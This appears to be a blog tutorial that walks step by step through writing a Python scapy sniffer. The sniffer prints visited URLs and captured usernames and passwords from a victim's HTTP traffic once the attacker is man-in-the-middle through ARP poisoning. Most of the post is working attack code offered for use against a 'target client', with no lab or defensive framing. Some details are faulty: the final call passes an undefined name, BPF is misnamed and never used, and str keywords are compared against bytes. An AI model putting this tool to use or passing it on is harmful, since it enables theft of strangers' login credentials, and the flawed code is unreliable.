---
layout: post
title:  The Process of Building a Packet Sniffer Tool
date:   2019-03-22
category: computer_science
---

In this documentation, I will go through the process on how to write a Packet Sniffer tool in Python which can sniff (capture) data flowing through an interface, filter this data, and display information on terminal like: visited websites, usernames, passwords, images and files downloaded.

Here, in order to capture data, you would need to already be the MITM (Man In The Middle) by using ARP table poisoning, or via any other method. For this tool we will be using the module scapy. To install scapy do the following.
```python
pip install scapy
pip install scapy_http
```
Note: scappy http module is used to filter for the HTTP layer. For this tool, we will build a packet sniffer that analyzes what HTTP website the client requests, and if they type in any username or password on that specific website, we will capture that data and print it out on our terminal.

1. In order to sniff data that is being sent to or from one of our computer interfaces, we will use a function called sniff that comes in the module scapy, but before we can use it let's import all the necessary libraries.
    ```python
    #!/usr/bin/env python
    import scapy.all as scapy
    from scapy.layers import http
    ```

2. Next, let's create a function called sniff() where we will pass in the interface. This interface will be the interface that we will be sniffing (capturing) data from. Here, "iface" means to specify the interface that is to be sniffed. "Store" is to tell scapy not to store packets in memory, hence it doesn't cause too much pressure on the computer. The "prn" argument allows us to specify a call back function, where this function will be called every time the sniff() function captures a packet.
    ```python
    def sniff(interface):
        scapy.sniff(iface=interface, store=False, prn=process_sniffed_pakcet)
    ```

3. After sniffing the data, next, we will write a function to capture the URL requested by the target client. Here, we are extracting data from a specific layer. For this we will use the [BPF (Berkeley Packet Sniffer)](http://biot.com/capstats/bpf.html) syntax. Since web browsers use the HTTP layer, we will look into the packet to see if it has a layer of HTTP request, and if it does, then we will return that packet. So, in order to extract the URL visited by the user, we will use the HTTP request layer which contains the information of the visited/requested web page. Here, "Host" contains the first part of the URL and "Path" contains the rest of the URL. (Note: if you do print(packet.show) you will be shown all the layers in the packet and the fields that are set in this packet. But beware it can get very messy and untidy. The reason of printing packet.show is so that we can find out which layer contains the information we are looking for.)
    ```python
    def get_url(packet):
        return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path
    ```

4. Next, we will write a function to capture login information, such as username and password that is entered into the website by the target client. After some search/analyze through packet.show output I noticed that there is a layer called "Raw" which contains all the information of the packets, and I noticed that we would only need the load field. Hence, the following code. Here, to find whether a specific element substring is contained in load, we will create a list of keywords.
    ```python
    def get_login_info(packet):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "password", "pass"]
            for keyword in keywords:
                if keyword in load:
                    return load
    ```

5. Next, we will write the callback function which we specified in step 2. This function will be called every time the sniff() function captures a packet. Here, we will call the get_url function from step 3 to get URL requested by the target client and we will print the information out on terminal. Also, we will call the get_login_info function from step 4 to get the login information entered by the target client and we will print it out to terminal. (Note: here, I have used "\n\n" in the print statement, so that when it shows up on terminal, the print statement will be easier to find.)
    ```python
    def process_sniffed_pakcet(packet):
        if packet.haslayer(http.HTTPRequest):
            url = get_url(packet)
            print("[+] HTTP Request >> " + url)

            login_info = get_login_info(packet)
            if login_info:
                print("\n\n[+] Possible Username/Password >> " + login_info + "\n\n")
    ```

6. Finally, we will call the sniff function and pass in the specific interface that is to be sniffed. The specified interface needs to have packets flowing through it. For example, this is achieved after a target Client and Access Point have been ARP spoofed, causing packets to redirect flow of packets through the interface that is used to spoof.
    ```python
    sniff(eth0)
    ```

7. Now, we have a fully working Packet Sniffer tool which can help us see URLs, usernames and passwords sent by the target. If you get stuck in the process or have any questions, leave a comment down below and I will be happy to answer them.
